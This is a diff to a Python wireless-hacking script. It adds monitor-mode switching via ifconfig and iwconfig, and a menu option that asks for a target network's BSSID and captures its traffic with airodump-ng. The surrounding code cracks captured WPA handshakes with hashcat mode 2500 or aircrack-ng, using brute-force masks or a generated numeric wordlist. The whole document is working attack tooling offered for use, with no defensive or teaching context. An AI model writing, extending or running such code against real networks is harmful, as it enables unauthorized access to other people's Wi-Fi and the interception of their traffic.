@@ -12,13 +12,33 @@ def show_banner():
  _    _            _     _ 
 | |  | |          | |   (_)
 | |__| | __ _  ___| |__  _ 
-|  __  |/ _` |/ __| '_ \| |
+|  __  |/ _` |/ __| '_ \\| |
 | |  | | (_| | (__| | | | |
-|_|  |_|\__,_|\___|_| |_|_|
+|_|  |_|\\__,_|\\___|_| |_|_|
                           
 {Style.RESET_ALL}
 """
     print(banner)
+
+def enable_monitor_mode(interface):
+    try:
+        print(f"Enabling monitor mode on {interface}...")
+        subprocess.run(["ifconfig", interface, "down"], check=True)
+        subprocess.run(["iwconfig", interface, "mode", "monitor"], check=True)
+        subprocess.run(["ifconfig", interface, "up"], check=True)
+        print(f"Monitor mode enabled on {interface}.")
+    except Exception as e:
+        print(f"Error enabling monitor mode: {e}")
+
+def disable_monitor_mode(interface):
+    try:
+        print(f"Disabling monitor mode on {interface}...")
+        subprocess.run(["ifconfig", interface, "down"], check=True)
+        subprocess.run(["iwconfig", interface, "mode", "managed"], check=True)
+        subprocess.run(["ifconfig", interface, "up"], check=True)
+        print(f"Monitor mode disabled on {interface}.")
+    except Exception as e:
+        print(f"Error disabling monitor mode: {e}")
 
 def list_network_adapters():
     try:
@@ -31,6 +51,7 @@ def list_network_adapters():
         return []
 
 def scan_networks(interface, show_hidden):
+    enable_monitor_mode(interface)
     networks = []
     
     def packet_handler(packet):
@@ -44,19 +65,23 @@ def scan_networks(interface, show_hidden):
 
     print(f"Scanning for networks on {interface}...")
     sniff(iface=interface, prn=packet_handler, timeout=10)
+    disable_monitor_mode(interface)
 
     print("Available networks:")
     for i, net in enumerate(networks):
         print(f"{i + 1}. SSID: {net['ssid']} | BSSID: {net['bssid']}")
-    
+
     return networks
 
 def capture_packets(interface, bssid):
+    enable_monitor_mode(interface)
     try:
         print(f"Capturing packets on {interface} for BSSID {bssid}...")
         subprocess.run(["airodump-ng", interface, "-w", "capture", "--output-format", "cap", "--bssid", bssid], check=True)
     except Exception as e:
         print(f"Error capturing packets: {e}")
+    finally:
+        disable_monitor_mode(interface)
 
 def create_wordlist():
     filename = input("Enter the filename for your wordlist: ")
@@ -111,19 +136,16 @@ def crack_password(cap_file, wordlist=None, use_gpu=False, custom_input=None, us
                 return
 
             if use_hashcat:
-                # Construct Hashcat mask based on user input
                 hashcat_mask = '?1' * length
                 hashcat_charsets = f'-1{charset}'
-
                 print(f"Cracking password using custom input with Hashcat...")
                 subprocess.run(["hashcat", "-m", "2500", hashcat_charsets, cap_file, hashcat_mask], check=True)
             else:
                 print(f"Cracking password using custom input with Aircrack-ng...")
                 wordlist_file = "custom_wordlist.txt"
                 with open(wordlist_file, 'w') as f:
-                    for i in range(10**length):  # This generates simple numeric combinations
+                    for i in range(10**length):
                         f.write(f"{i:0{length}}\n")
-
                 subprocess.run(["aircrack-ng", "-w", wordlist_file, cap_file], check=True)
     except Exception as e:
         print(f"Error cracking password: {e}")
@@ -176,8 +198,17 @@ def main():
             else:
                 print("No network adapters found.")
         elif choice == "4":
-            # Similar logic as above
-            pass
+            adapters = list_network_adapters()
+            if adapters:
+                print("Available network adapters:")
+                for i, adapter in enumerate(adapters):
+                    print(f"{i + 1}. {adapter}")
+                adapter_choice = int(input("Select the network adapter to use (number): ")) - 1
+                interface = adapters[adapter_choice]
+                bssid = input("Enter the BSSID of the target network: ")
+                capture_packets(interface, bssid)
+            else:
+                print("No network adapters found.")
         elif choice == "10":
             print("Exiting...")
             break
